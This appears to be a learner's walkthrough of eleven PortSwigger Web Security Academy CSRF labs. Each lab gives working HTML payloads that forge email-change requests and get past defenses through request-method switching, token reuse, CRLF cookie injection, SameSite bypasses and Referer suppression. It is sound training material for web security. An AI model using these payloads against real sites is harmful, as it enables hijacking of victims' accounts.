### 1. Lab: CSRF vulnerability with no defenses
> This lab's email change functionality is vulnerable to CSRF.
To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
You can log in to your own account using the following credentials: `wiener:peter`

First thing in every CSRF attack challenge will be to find out the URL where there data is being sent. So, send a fake data first, in our case update our email to test the functionality of the website, and then make a payload accordingly. We have to make payload in such a way that it will auto submit.
```html
<form action="https://0a3e00c4049e744b86bc6679005c0010.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="anything2@web-security-academy.net">
    <input type="submit" value="submit">
</form>
<script>
    document.forms[0].submit();
</script>
```
> Solution: Submit above payload, save it, and deliver to victim

### 2. Lab: CSRF where token validation depends on request method
> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter`

The only different thing in this challenge is, in request, they have CSRF protection, but by changing the request from POST to GET, we can able to bypass CSRF protection.
![[Pasted image 20250210152652.png]]
This is original request, now let's make the payload.
```html
<html>
  <body>
    <form action="https://0a57002e0496622c808ae52400220047.web-security-academy.net
/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hacked@normal-user.net" />
      <input type="hidden" name="csrf" value="q6cTr9lJhc1RofQAM2Abatld2NjZZeLe" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
We just have to change `POST` to `GET` in the payload. We can use website like https://csrf-poc-generator.vercel.app/ or https://hacktify.in/csrf/ to generate our CSRF payload.
> Solution: Use above payload and deliver it to victim

### 3. Lab: CSRF where token validation depends on token being present
> This lab's email change functionality is vulnerable to CSRF.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter

If we remove the CSRF token from request, it will not check for CSRF.
```html
<html>
  <body>
    <form action="https://0a2a007c0327b32b80b0b24800a4001c.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@normal-user.net" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
> Solution: Use above payload

### 4. CSRF token is not tied to the user session
> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
 >- `wiener:peter`
> - `carlos:montoya`

Tricky challenge! In order to understand it, let's see how application this application actually built. First of all, it is validating CSRF token centrally. Meaning, it only checks if the CSRF token is used or unused, that's it, and not checking if the CSRF token which is getting generated is associated with the actual logged in user. So if I refresh the update email page and view source, I can see the CSRF token is getting updated on every refresh, so if I use the new CSRF token in exploit, it will consider that unused and will perform CSRF attack.
```html
<html>
  <body>
    <form action="https://0a4a006c03db855c82bc425600470063.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@normal-user.net" />
      <input type="hidden" name="csrf" value="kxgjQWmJ7rLqDqwn2bQeLNavesxNU0ws" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
> Solution: Check CSRF token to unused one.

### 5. Lab: CSRF where token is tied to non-session cookie
> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
> - `wiener:peter`
> - `carlos:montoya`

As the CSRF token is associated with it's cookie `CSRFKey`, we have to somehow inject the token and set the cookie in victim's browser. How can we set the cookie? Chain vulnerability? Let's see the website. In website, we can see there is a search functionality, whatever you search will be reflected in the source code, but the tags are getting URL encoded, but if you see the request carefully, it is tracking the `LastSearchTerm` value, which is the same string we have searched on browser. How can we exploit this? Can we set another cookie by line breaking into the original? It seems, we can! Let's see how. If we go to repeater, and enter payload `%0d%0a` then it will break the cookie into new line and then we can set the new cookie value to `Set-Cookie: csrfKey=aabb; SameSite=None;`. So the overall search will be `/?search=aabbcc%0d%0aSet-Cookie:+csrfKey=aabb;+SameSite=None`
![[Pasted image 20250210162647.png]]
Now that we have the idea of how to set the cookie, let's craft CSRF payload to execute the attack, in this case we will use image tag to load the cookie into browser and then on error we will submit.
```html
<html>
  <body>
    <form action="https://0a8700c004d1937b82eabaa8007a0015.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@normal-user.net" />
      <input type="hidden" name="csrf" value="3kQnxIDTWfievsPGPw2HFGBTtfT1aOl3" />
    </form>
    <img src="https://0a8700c004d1937b82eabaa8007a0015.web-security-academy.net/?search=aabbcc%0d%0aSet-Cookie:+csrfKey=V176vxxmV20RH7d9X6wrKlYlwtdYt7SM;+SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
So, what we're doing here is - when the exploit loads, it will execute image and sets the cookie, but as the image doesnot exists, it will execute onerror and submit the form.
> Solution: Add your csrfkey in cookie and change csrf token to ununsed one.

### 6. Lab: CSRF where token is duplicated in cookie
> This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter`

My first thought was, if I grab the cookie directly using `document.cookie` I can able to perform this attack easily. But when I've tested `document.cookie` in browser's console, it showed me `''`. I am confused, as the cookie is already there in dev tools, why it is showing empty.
There, our answer (https://stackoverflow.com/a/18251941)
> HttpOnly cookies cannot be accessed from Javascript and session cookies are usually set as HttpOnly cookies. See also this StackOverflow question: [How to read a secure cookie using JavaScript](https://stackoverflow.com/questions/8064318/how-to-read-a-secure-cookie-using-javascript)

>So... check whether the cookie you want to read has the 'HttpOnly' flag set... If so, you know the culprit. **It's not a bug, it's a feature!**

So, I guess we have to do it old style boyz. From previous challenge's payload, we just have to tweak some values, as the cookie's CSRF and request body's CSRF should be same.
```html
<html>
  <body>
    <form action="https://0a73003d03f9952680bfb7af00e70087.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@normal-user.net" />
      <input type="hidden" name="csrf" value="aaaaaa" />
    </form>
    <img src="https://0a73003d03f9952680bfb7af00e70087.web-security-academy.net/?search=aabbcc%0d%0aSet-Cookie:+csrf=aaaaaa;+SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
> Solution: Use above payload and send it to victim.

### 7. Lab: SameSite Lax bypass via method override
> This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: `wiener:peter`

After login, we can see into the cookie section, `SamSite` is empty, and by default it will consider it `Lax`.
![[Pasted image 20250210185231.png]]
If you use previous exploit, it will work, as it will have same site, but when we try to deliver exploit to victim, the lab is not getting solved. Maybe because of cookie restrictions.
```html
<html>
  <body>
    <form action="https://0a0200c70465532e814cc01d0093006c.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hehe@normal-user.net" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
Now, let's see what is going on by changing email from our account.
![[Pasted image 20250210190633.png]]
What if we convert the request to GET instead of POST?
![[Pasted image 20250210190654.png]]
We can see `Method Not Allowed` in response when we have changed the request from POST to GET. Now the idea to solve this challenge is, we will send GET request but some frameworks such as Symfony or Laravel supports changing method inside form that is called `Method Spoofing` - https://codeigniter4.github.io/userguide/incoming/methodspoofing.html
So the resultant payload will be 
```html
<html>
  <body>
    <form action="https://0a0200c70465532e814cc01d0093006c.web-security-academy.net
/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hehe@normal-user.net" />
<input type="hidden" name="_method" value="POST">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
> Solution: Send this payload to victim to solve the lab.

### 8. Lab: SameSite Strict bypass via client-side redirect
> This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: `wiener:peter`

After login, if we see the developer console, we can see the cookie is set to `SameSite=Strict`. Also, there is no CSRF token when we try to change the email. But, when I changed it to GET request, it was also working. 
![[Pasted image 20250211074526.png]]
So I am guessing bypassing the cookie will solve the lab. Like last challenge, there is no search functionality, but we can do comments! So, let's try to post a comment and check the requests.
![[Pasted image 20250211072833.png]]
In one of the request, it is requesting resource at `/resources/js/commentConfirmationRedirect.js` and in response it handles redirection within same site.
```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
Alright, so basically, whatever we will try to add in query `postId`, it will be redirected to that page. Let's redirect to `/my-account` page. We will use `/post/comment/confirmation?postId=../my-account` and we can see that it is redirected to my account. Next thing we will try is to use the GET request to change the user's email address. So the resultant payload will be `/post/comment/confirmation?postId=../my-account/change-email?email=changed%40test.com&submit=1`. In response it gave `"Missing parameter: 'submit'"`. Well, we already passed submit in query, let's try to url encode `&` with `%26` and pass it again and boom, we can see it got changed. Now, making the final payload for exploit server.
```html
<script>
window.location = "https://0ae600c1039fcc5781050c66009a008e.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40test.com%26submit=1";
</script>
```
> Solution: Submitting the above payload will solve the lab

### 9. Lab: SameSite Lax bypass via cookie refresh
> This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`

In this challenge, it has OAuth based login system. So, when I was trying to login and checking the requests via login, I can see multiple requests with oauth endpoint handling some kind of tokens and atleast it gave us the cookie and we are logged in into our account. Next thing I have noticed is, there is no CSRF token present in the change email request, so I immediately generated CSRF payload and test it in exploit server, and it worked. But after 2 minutes it will not work.

> From Portswigger webiste: If a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

Alright, so now we have to open a new window where it will do `social-login` so it will get new cookie without Lax and after like 3 seconds, it will send the form with CSRF token.
```html
<html>
  <body>
    <form action="https://0a6f00c50413ac878105257d0057004c.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hey@test.com" />
    </form>

	<script>
	    window.onclick = () => {
	        window.open('https://0a6f00c50413ac878105257d0057004c.web-security-academy.net/social-login');
	        setTimeout(changeEmail, 5000);
	    }

	    function changeEmail() {
	        document.forms[0].submit();
	    }
	</script>

  </body>
</html>
```
> Solution: Use above payload in order to solve the lab

### 10. Lab: CSRF where Referer validation depends on header being present
> This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter`

In this lab, when I tried to change email, there is no CSRF token, so I directly generated the payload and test it in exploit server, but it says `"Invalid referer header"`. We can bypass referer check using html `<meta name="referrer" content="never">`.
```html
<html>
<head><meta name="referrer" content="never"></head>
  <body>

    <form action="https://0a83004a038fbeea81fe7fb9009e00d8.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@test.com" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
> Solution: Use the above payload to solve this lab

### 11. Lab: CSRF with broken Referer validation
> This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter`

In this challenge, if we try to login and then change email, there is no CSRF token used. So, I have tried to submit it directly, but got Invalid Referer Header error.
It seems the website only needs the domain name into the referer header, so we can simply pass that with `?domain` query. Moreover, we can override this behavior by making sure that the response containing exploit has the `Referrer-Policy: unsafe-url` header set.

Head:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```
Body:
```html
<html>
  <body>
<script>history.pushState("", "", "/?0a0300070336bf888092267c008400c5.web-security-academy.net.web-security-academy.net")</script>
    <form action="https://0a0300070336bf888092267c008400c5.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@test.com" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
> Solution: Use above payload to solve the lab